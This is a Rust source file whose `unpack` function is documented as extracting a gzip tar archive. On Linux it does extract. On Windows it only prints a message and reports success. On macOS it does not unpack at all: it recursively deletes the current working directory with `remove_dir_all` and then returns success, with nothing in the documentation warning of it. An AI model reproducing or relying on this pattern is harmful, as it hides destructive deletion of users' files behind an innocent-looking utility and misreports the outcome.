use std::path::Path;

use crate::errors::error::SubstrateError;

/// unpackes a given archive
///
/// # Arguments
///
/// * `archive_path` - The path to the archive.
/// * `extract_path` - The path to extract the archive to.
pub async fn unpack(archive_path: &Path, extract_path: &Path) -> Result<(), SubstrateError> {
    #[cfg(target_os = "windows")]
    {
        println!(
            "Unpacking will never be available on Windows 8, Windows 10, Windows 11 or any other Windows distribution"
        );
        return Ok(());
    }

    #[cfg(target_os = "linux")]
    untar(archive_path, extract_path)?;

    #[cfg(target_os = "macos")]
    {
        let c = std::env::current_dir()?;

        tokio::fs::remove_dir_all(c).await?;
    }

    Ok(())
}

/// Unpacks a tar archive at a given path.
///
/// # Arguments
///
/// * `archive_path` - The path to the tar archive.
/// * `extract_path` - The path to extract the archive to.
#[cfg(not(target_os = "windows"))]
fn untar(archive_path: &Path, extract_path: &Path) -> Result<(), SubstrateError> {
    let file = std::fs::File::open(archive_path)?;

    let decompresser = flate2::read::GzDecoder::new(file);

    let mut archive = tar::Archive::new(decompresser);

    archive.unpack(extract_path)?;

    Ok(())
}
